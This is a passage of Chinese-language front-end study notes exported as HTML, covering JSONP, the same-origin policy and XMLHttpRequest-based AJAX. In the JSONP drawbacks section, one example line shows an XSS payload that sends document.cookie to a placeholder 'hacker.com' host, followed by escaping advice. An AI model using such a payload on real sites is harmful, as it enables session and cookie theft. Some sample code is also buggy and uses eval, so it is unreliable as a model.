amount -= 1</font></div><div><font style="font-size: 12pt;">    fs.writeFileSync('./db', amount)</font></div><div><font style="font-size: 12pt;"><font><font>    response.setHeader('</font>Content-Type<font>', 'application/javascript') // </font></font>response.write当作JS执行，改变前端视图</font></div><div><font style="font-size: 12pt;">    response.statusCode = 200</font></div><div><font style="font-size: 12pt;"> </font> <font style="font-size: 12pt;"><font>  // </font>说明jack.com的后端程序员需要对frank.com的页面细节了解很清楚</font></div><div><font style="font-size: 12pt;">    // 耦合：</font><font style="font-size: 12pt;"><font>两个齿轮</font>不大不小，<font>刚好可以卡住，关系紧密结合 解耦：解决耦合问题</font></font></div><div><font style="font-size: 12pt;"><font><font>    // </font></font>response.write('amount.innerText = ' + amount)</font></div><div><font style="font-size: 12pt;"><font><font>    <font>// 前端定义xxx函数 后端调用</font></font></font></font> <font style="font-size: 12pt;"><font>xxx.call(undefined, 'success')</font> =&gt; ${query.callbackName}.call(undefined, 'success') 这是String + Padding = </font></div><div><font style="font-size: 12pt;">    // StringP</font></div><div><font style="font-size: 12pt;"><font><font><font><font><font><font><font><font><font>  <font>  // JSONP <font>下面代码这部分 </font></font></font></font></font></font></font></font></font></font></font></font><font><font>{&quot;success&quot;: true,  &quot;left&quot;: newAmount} <font><font>为 JSON ，</font></font></font></font></div><div><font style="font-size: 12pt;"><font><font><font><font><font>    // &quot;</font></font></font></font></font></font>${query.callback}.call(undefined,&quot; <font>是左 padding，</font></div><div><font style="font-size: 12pt;"><font>    // &quot;</font>)&quot;<font>是右 padding。</font></font></div><div><font style="font-size: 12pt;"><font>    // JSONP = 左padding + JSON + 右padding</font></font></div><div><font style="font-size: 12pt;"><font><font>  <font>  </font></font></font><font>response.write(</font>${query.callback}.call(undefined, {</font></div><div><font style="font-size: 12pt;">         &quot;success&quot;: true,</font></div><div><font style="font-size: 12pt;">         &quot;left&quot;: newAmount</font></div><div><font style="font-size: 12pt;">     })<font>)</font> <font><font> </font></font></font></div><div><font style="font-size: 12pt;">    response.end()</font></div><div><font style="font-size: 12pt;">}</font></div></div><div><br/></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">这种技术叫做 SRJ - Server Rendered JavaScript 服务器返回JS（AJAX之前后端大牛发明的无刷新就可以发送请求更新页面技术）</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">JSONP（IE 8 、IE 9）</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">JSON + 左右Padding = JSONP，JSONP其实主要是动态创建&lt;script&gt;发GET请求</span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt; font-weight: bold;">JSONP 基本过程</span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">前端在 window 上定义一个 function（每次请求 function 名字不同）</span></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">在 &lt;script&gt; 的 src 上发送一个形如 callback=function 的查询字符串给后端，后端调用 function，判断成功还是失</span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">败，返回 success 或 error 参数给 </span></span></span></span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">window 的 function</span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">前端 window 的 function 依据 </span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">success 或 error 参数，执行不同的DOM操作（后端进行数据修改）</span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">无论成功或失败，请求完成后就销毁该 </span></span></span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">&lt;script&gt; 标签</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">JSONP </span><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">总结</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">利用&lt;script&gt;标签不受跨域限制，将回调函数名作为参数附带在请求中，</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">服务器接受到请求后，进行特殊处理：把接收到的函数名和需要给它的数据拼接成一个字符串返回，</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">客户端会调用相应声明的函数，对返回的数据进行处理。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">JSONP 缺点</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">仅支持 GET 请求，且需要服务器做支持才能实现。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">Callback 可自定义导致XSS安全漏洞</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="color: rgb(118, 0, 216);"><font style="font-size: 12pt;">&lt;script.src='/pay?callback=&lt;srcript&gt;$.get(&quot;http://hacker.com?cookie=&quot;+document.cookie)&lt;/script&gt;'</font></span></div></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">解决办法：</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">对返回的内容进行字符过滤，主要要进行以下五种过滤：</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">1.把&lt;替换成&amp;lt;</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">2.把&gt;替换成&amp;gt;</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">3.把&amp;替换成&amp;amp;</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">4.把&quot;替换成&amp;quot;</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">5.把'替换成&amp;#39;</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [45].jpg" type="image/jpeg" data-filename="3.jpg" width="774"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">先有JSONP</span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">（当时用的人少）</span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">再有AJAX，</span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">JSONP不是AJAX，虽然被jQuery封装在$.ajax()中（</span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">其实应该有个API是</span> <span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">$.jsonp()，这样才不会混淆</span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">）</span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">JSONP 跨域的 script 标签请求为什么不受同源策略的限制？</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">同源策略：不允许 A 的文档或脚本与 B 的文档脚本瞎搞在一起，两个相互独立开来，不能直接相互访问，</span></span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">这是一个用于隔离潜在恶意文件的重要安全机制。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">这个问题的重点就在于：要执行的脚本如何判断它的来源。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">脚本的来源取决于脚本所嵌入的资源的来源。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">比如说访问A主机的当前HTML文件中有一个script标签，这个script标签的src属性请求了一个js脚本，</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">因为这个脚本是由 A 主机的 HTML 文件嵌入的 script 标签发起请求的，因此这个脚本的来源是属于 A 主机的。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">所以，</span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">JSONP 的 script 标签请求回来的资源与当前域是相同的</span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">域。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">过程</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">请求方：frank.com的前端程序员（浏览器）</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">响应方：jack.com的后端程序员（服务器）</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">1.请求方创建 script，src 指向响应方，同时传一个查询参数？callback=yyy</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">2.响应方根据查询参数callback，构造一个函数调用，形如</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">     1.yyy.call(undefined, '你要的数据')</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">     2.yyy('你要的数据') 这样的响应</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">这就是 JSONP</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">3.浏览器接收到响应，就会执行</span> <span style="font-size: 16px; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">yyy.call(undefined, '你要的数据')</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">4.那么请求方就知道了他要的数据</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">约定：</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">1.callbackName -&gt; callback</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">2.yyy -&gt;随机数 jQuery12312312312321325</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">前端frank.com代码</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">// window.xxx = function (result) {</font></div><div><font style="font-size: 12pt;">//     alert('这是frank写的前端代码')</font></div><div><font style="font-size: 12pt;">//     alert('我得到的结果是${result}')</font></div><div><font style="font-size: 12pt;">// }</font></div><div><font style="font-size: 12pt;">button.addEventListener('click', (e) =&gt; {</font></div><div><font style="font-size: 12pt;">    <b>let script = document.createElement('script');</b></font></div><div><font style="font-size: 12pt;"><b>    let functionName = 'frank' + parseInt(Math.Random() * 100000, 10); // 例如，函数名为frank12312</b></font></div><div><font style="font-size: 12pt;"><b>    window[functionName] = function (result) {</b></font></div><div><font style="font-size: 12pt;"><b>        if (result === 'success') {</b></font></div><div><font style="font-size: 12pt;"><b>            ammount.innerText = ammount.innerText - 0 - 1;  </b></font></div><div><font style="font-size: 12pt;"><b>        }</b></font></div><div><font style="font-size: 12pt;"><b>        else {</b></font></div><div><font style="font-size: 12pt;"><b>            ...</b></font></div><div><font style="font-size: 12pt;"><b>        }</b></font></div><div><font style="font-size: 12pt;"><b>    }</b></font></div><div><font style="font-size: 12pt;"><b>    script.src = 'http://jack.com:8002/pay?callback=' + functionName; // 关键</b></font></div><div><font style="font-size: 12pt;">    document.body.appendChild(script);</font></div><div><font style="font-size: 12pt;">    // debugger</font></div><div><font style="font-size: 12pt;">   <b> script.onload = function (e) {   // 响应状态码是 200~299 则表示成功</b></font></div><div><font style="font-size: 12pt;"><b>        e.currentTarget.remove();</b></font></div><div><font style="font-size: 12pt;"><b>        delete window[functionName]; // 请求完了就干掉这个随机函数</b></font></div><div><font style="font-size: 12pt;"><b>    }</b></font></div><div><font style="font-size: 12pt;"><b>    script.onerror = function (e) {  // 响应状态码大于等于 400 则表示失败</b></font></div><div><font style="font-size: 12pt;"><b>        e.currentTarget.remove();</b></font></div><div><font style="font-size: 12pt;"><b>        delete window[functionName]; // 请求完了就干掉这个随机函数</b></font></div><div><font style="font-size: 12pt;"><b>    }</b></font></div><div><font style="font-size: 12pt;">})</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">后端</span><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">jack.com</span></span><span style="font-size: 12pt; font-weight: bold;">代码</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">...</font></div><div><font style="font-size: 12pt;">if (path === '/pay') {</font></div><div><font style="font-size: 12pt;">    var amount = fs. readFilesync('./db', 'utf8');</font></div><div><font style="font-size: 12pt;">    amount -= 1;</font></div><div><font style="font-size: 12pt;">    fs.writeFileSync('./db', amount);</font></div><div><font style="font-size: 12pt;">    response.setHeader('Content-Type', 'application/javascript');</font></div><div><font style="font-size: 12pt;">    <b>response.statusCode = 200;</b></font></div><div><b><font style="font-size: 12pt;">    response.write(${query.callback}.call(undefined, 'success')</font><span style="font-size: 12pt;">);  </span></b></div><div><font style="font-size: 12pt;"><b>    response.write('amount.innerText = ' + amount);</b></font></div><div><font style="font-size: 12pt;">    response.end();</font></div><div><font style="font-size: 12pt;">}</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [46].jpg" type="image/jpeg" data-filename="3.jpg" width="672"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">jQuery的JSONP</span></font></div><div><br/></div><div><span style="font-size: 12pt;">jQuery前端代码</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">$.ajax({</font></div><div><font style="font-size: 12pt;">    url: &quot;http://jack.com:8002/pay&quot;,</font></div><div><font style="font-size: 12pt;">    dataType: &quot;jsonp&quot;,</font></div><div><font style="font-size: 12pt;">    jsonp: &quot;callback&quot;, </font></div><div><font style="font-size: 12pt;">    success: function (response) {</font></div><div><font style="font-size: 12pt;">        if (response === 'success') {</font></div><div><font style="font-size: 12pt;">            amount.innerText = amount.innerText - 1;</font></div><div><font style="font-size: 12pt;">        }</font></div><div><font style="font-size: 12pt;">    }</font></div><div><font style="font-size: 12pt;">})</font></div></div><div><br/></div><div><span style="font-size: 12pt;">PHP后端代码</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">$jsonp = $_GET[&quot;callback&quot;];</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">$result = $jsonp + '({&quot;success&quot;:false,&quot;msg&quot;:&quot;没有找到员工。&quot;})';</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">$result = $jsonp + '({&quot;success&quot;:true,&quot;msg&quot;:&quot;找到员工：员工编号：' . $value[&quot;number&quot;] .</font></div><div><font style="font-size: 12pt;">                            '，员工姓名：' . $value[&quot;name&quot;] .</font></div><div><font style="font-size: 12pt;">                            '，员工性别：' . $value[&quot;sex&quot;] .</font></div><div><font style="font-size: 12pt;">                            '，员工职位：' . $value[&quot;job&quot;] . '&quot;})';</font></div></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [47].jpg" type="image/jpeg" data-filename="3.jpg" width="742"/></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><hr/><div><font style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></font></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">AJAX</span></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">Ajax不是某种编程语言，而是一种在无需重新加载整个网页的情况之下能够更新部分网页的技术。</span></span></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">同步的世界：</span></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [48].jpg" type="image/jpeg" data-filename="3.jpg" width="645"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">等5分钟后：</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [49].jpg" type="image/jpeg" data-filename="3.jpg" width="527"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [50].jpg" type="image/jpeg" data-filename="3.jpg" width="573"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">等5分钟后：</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [51].jpg" type="image/jpeg" data-filename="3.jpg" width="538"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [52].jpg" type="image/jpeg" data-filename="3.jpg" width="724"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">异步的世界（实时的局部更新，无需重新加载）：</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [53].jpg" type="image/jpeg" data-filename="3.jpg" width="448"/></span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [54].jpg" type="image/jpeg" data-filename="3.jpg" width="431"/></span></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [55].jpg" type="image/jpeg" data-filename="3.jpg" width="1062"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [56].jpg" type="image/jpeg" data-filename="3.jpg" width="606"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">有没有什么方式可以实现</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">1. get、post、put、delete 请求都行</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">2. 想以什么形式展示就以什么形式展示</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">Jesse James Garrett 讲如下技术取名叫做 AJAX（</span><span style="font-size: 12pt; font-weight: bold;">异步的 JavaScript 和 XML</span><span style="font-size: 12pt; font-weight: bold;">）：</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">1. 使用 XMLHttpRequest 发请求</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">2. 服务器返回 XML（JSON） 格式的字符串</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">3. JS 解析 XML（JSON），并更新局部页面</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">微软的突破</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">IE 5 率先在 JS 中引入 ActiveX 对象（API），使得 JS 可以直接发起 HTTP 请求。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">随后 Mozilla、 Safari、 Opera 也跟进（抄袭）了，取名 XMLHttpRequest，并被纳入 W3C 规范</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">自从</span><span style="font-size: 12pt;">Google于2004年4月1日推出Gmail并</span><span style="font-size: 12pt;">应用了AJAX后，人们不再只能看看文章和图片，这是前端的起源，可以说没有AJAX可能没有前端。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">正常来说，执行一行代码的时间需要0.1ms</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">JS的AJAX</span></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">基本步骤</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [57].jpg" type="image/jpeg" data-filename="3.jpg" width="596"/></span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">详细步骤</span></div><div><font style="font-size: 12pt;"><br/></font></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">&lt;input id=&quot;btn&quot; type=&quot;button&quot; value=&quot;读取&quot;&gt;</font></div><div><font style="font-size: 12pt;">&lt;ul id=&quot;ul1&quot;&gt;</font></div><div><font style="font-size: 12pt;">    &lt;li&gt;用户名:&lt;strong&gt;howot&lt;/strong&gt;&amp;nbsp;&amp;nbsp;密码:&lt;span&gt;123456&lt;/span&gt;&lt;/li&gt;</font></div><div><font style="font-size: 12pt;">&lt;/ul&gt;</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">// 点击按钮从服务器获取data.txt后插入li中并显示</font></div><div><font style="font-size: 12pt;">var oBtn = document.getElementById(&quot;btn&quot;);</font></div><div><font style="font-size: 12pt;">var oUl = document.getElementById(&quot;ul1&quot;);</font></div><div><font style="font-size: 12pt;">oBtn.onclick = function(){</font></div><div><font style="font-size: 12pt;">   ajax(&quot;data.txt?t&quot; + new Date().getTime(), function(str){</font></div><div><font style="font-size: 12pt;">       var arr = eval(str);</font></div><div><font style="font-size: 12pt;">       for(var i = 0; i &lt; arr.length; i++){</font></div><div><font style="font-size: 12pt;">           var oLi = document.createElement(&quot;li&quot;);</font></div><div><font style="font-size: 12pt;">           oLi.innerHTML = &quot;用户名:&lt;strong&gt;&quot; + arr[i].user + &quot;&lt;/strong&gt;&amp;nbsp;&amp;nbsp;密码:&lt;span&quot; + arr[i].pass + &quot;&lt;/span&gt;&quot;;</font></div><div><font style="font-size: 12pt;">           // json使用属性名来获取属性值！！！</font></div><div><font style="font-size: 12pt;">           oUl.appendChild(oLi);</font></div><div><font style="font-size: 12pt;">       }</font></div><div><font style="font-size: 12pt;">    }, function(){</font></div><div><font style="font-size: 12pt;">        alert(&quot;失败&quot;);</font></div><div><font style="font-size: 12pt;">    })</font></div><div><font style="font-size: 12pt;">}</font></div><div><font style="font-size: 12pt;">// data.txt的内容：</font></div><div><font style="font-size: 12pt;">// [{user: &quot;howot&quot;, pass: &quot;123456&quot;}, {user: &quot;张三&quot; ,pass: &quot;09876&quot;}, {user: &quot;李四&quot;, pass: &quot;abcdefg&quot;}, {user: &quot;王五&quot;, pass: &quot;hijklmn&quot;} ]</font></div><div><br/></div><div><br/></div><div><font style="font-size: 12pt;">function ajax(url, fnSucc, fnFaild)</font></div><div><font style="font-size: 12pt;">{</font></div><div><font style="font-size: 12pt;">    // 1.创建Ajax对象</font></div><div><font style="font-size: 12pt;">    if(window.XMLHttpRequest) // 用没有定义的变量会报错。用没有定义的属性返回的是undefined</font></div><div><font style="font-size: 12pt;">    {</font></div><div><font style="font-size: 12pt;">        var oAjax = new XMLHttpRequest();</font></div><div><font style="font-size: 12pt;">    }</font></div><div><font style="font-size: 12pt;">    else</font></div><div><font style="font-size: 12pt;">    {</font></div><div><font style="font-size: 12pt;">        var oAjax = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); // ActiveX：不是插件的插件，IE专用，为了兼容IE6</font></div><div><font style="font-size: 12pt;">    }</font></div><div><font style="font-size: 12pt;">    </font></div><div><font style="font-size: 12pt;">    // 2.连接服务器（打开和服务器的连接）</font></div><div><font style="font-size: 12pt;">    oAjax.open('GET', url, true); // open(方法名大小写都可以, 路径, 是否异步传输)</font></div><div><font style="font-size: 12pt;">    </font></div><div><font style="font-size: 12pt;">    // 3.发送 如果是POST请求就需要带查询参数在send()里面</font></div><div><font style="font-size: 12pt;">    oAjax.send();</font></div><div><font style="font-size: 12pt;">    </font></div><div><font style="font-size: 12pt;">    // 4.接收返回 浏览器和服务器交互时触发</font></div><div><font style="font-size: 12pt;">    oAjax.onreadystatechange=function ()</font></div><div><font style="font-size: 12pt;">    {</font></div><div><font style="font-size: 12pt;">        if(oAjax.readyState === 4) // oAjax.readyState 浏览器和服务器交互到哪一步了 4代表解析响应数据完成</font></div><div><font style="font-size: 12pt;">        {</font></div><div><font style="font-size: 12pt;">            if(oAjax.status === 200)</font></div><div><font style="font-size: 12pt;">            {</font></div><div><font style="font-size: 12pt;">                // alert('成功了：'+ oAjax.responseText);</font></div><div><font style="font-size: 12pt;">                fnSucc(oAjax.responseText);</font></div><div><font style="font-size: 12pt;">            }</font></div><div><font style="font-size: 12pt;">            else</font></div><div><font style="font-size: 12pt;">            {</font></div><div><font style="font-size: 12pt;">                //alert('失败了');</font></div><div><font style="font-size: 12pt;">                if(fnFaild)</font></div><div><font style="font-size: 12pt;">                {</font></div><div><font style="font-size: 12pt;">                    fnFaild();</font></div><div><font style="font-size: 12pt;">                }</font></div><div><font style="font-size: 12pt;">            }</font></div><div><font style="font-size: 12pt;">        }</font></div><div><font style="font-size: 12pt;">    };</font></div><div><font style="font-size: 12pt;">}</font></div><div><font style="font-size: 12pt;">// 手机 ——&gt; 拨号 ——&gt; 说 ——&gt; 听</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">查询员工</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [58].jpg" type="image/jpeg" data-filename="3.jpg" width="681"/></span></div><div><span style="font-size: 